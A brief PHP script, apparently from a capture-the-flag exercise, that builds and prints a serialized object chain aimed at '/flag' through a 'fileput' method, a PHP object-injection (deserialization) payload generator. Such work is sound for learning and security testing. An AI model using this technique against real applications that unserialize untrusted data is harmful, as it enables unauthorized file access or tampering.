<?php
class cls1 {
    var $cls;
    var $arr = array(0 => 'fileput');

    function __construct() {
        $this->cls = new cls2();
    }
}

class cls2 {
    var $filename = '/flag';
    var $txt = '';
}

$instance = new cls1();
echo serialize($instance);
?>
